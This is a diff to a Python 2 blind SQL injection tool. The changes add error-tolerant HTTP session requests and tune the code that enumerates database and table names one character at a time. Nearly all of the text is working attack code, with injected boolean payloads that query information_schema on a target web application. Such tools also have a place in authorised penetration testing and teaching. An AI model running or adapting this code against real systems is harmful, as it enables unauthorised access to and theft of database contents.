@@ -102,7 +102,14 @@ def eunum_databases(url, payload, bypass):
         # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
         uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
         # print str(uri)
-        server_response = request_handler(uri)
+        # server_response = request_handler(uri)
+        try:
+            server_response = session.get(uri).content
+        except requests.exceptions.RequestException as e:
+            print e
+            database_increment -= 1
+            continue
+
         server_response_status = validate_request(server_response)
 
         # If status is false then we know the number of databases
@@ -111,15 +118,19 @@ def eunum_databases(url, payload, bypass):
 
             # Count how many letters in each database name
             for database_number in range(0,database_increment):
-
-
                 database_letter_count = 1
 
                 # Count how many chars in db name, we assume the database name to be less than 128 characters
                 while (database_letter_count < 128):
                     # ' and (select length(schema_name) from information_schema.schemata limit 0,1)>=19 or '
                     uri = url + str(payload) + "(select length(schema_name) from information_schema.schemata limit " + str(database_number) + ",1)>=" + str(database_letter_count) + bypass
-                    server_response = request_handler(uri)
+                    # server_response = request_handler(uri)
+                    try:
+                        server_response = session.get(uri).content
+                    except requests.exceptions.RequestException as e:
+                        print e
+                        continue
+
                     server_response_status = validate_request(server_response)
                     # print server_response_status, database_letter_count
 
@@ -135,7 +146,14 @@ def eunum_databases(url, payload, bypass):
                                 uri = url + str(payload) + "ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(letter_count) + ",1))>=" + str(database_letter) + bypass
                                 # print str(uri)
 
-                                server_response = request_handler(uri)
+                                # server_response = request_handler(uri)
+                                try:
+                                    server_response = session.get(uri).content
+                                except requests.exceptions.RequestException as e:
+                                    print e
+                                    database_letter -= 1
+                                    continue
+
                                 server_response_status = validate_request(server_response)
 
                                 # If status is false then database_letter - 1 was the n-th char of the database name
@@ -144,16 +162,17 @@ def eunum_databases(url, payload, bypass):
                                     print "Database name: " + str(database_name)
                                     break
 
+                        print database_name
+                        dump[database_name] = {}
+                        print dump
+
+                        break
+
                     # elif server_response_status is True:
                     database_letter_count = database_letter_count + 1
 
-                print database_name
-                dump[database_name] += {}
-
         elif server_response_status is True:
             database_increment = database_increment + 1
-
-    print dump
 
 # --------- Enumerate database tables ----------
 def enum_tables(url, payload, bypass, database):
@@ -199,7 +218,8 @@ def enum_tables(url, payload, bypass, database):
                             for table_letter_count in range(1,table_letter_count):
 
                                 # Loop in ascii range to guess each character
-                                for table_letter in range(1,128):
+                                # Reduced range to improve performance
+                                for table_letter in range(33,127):
                                     # uri = url + "' and ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
                                     uri = url + str(payload) + "ascii(substring((select table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit " + str(table_number) + ",1)," + str(table_letter_count) + ",1))>=" + str(table_letter) + bypass
                                     server_response = request_handler(uri)
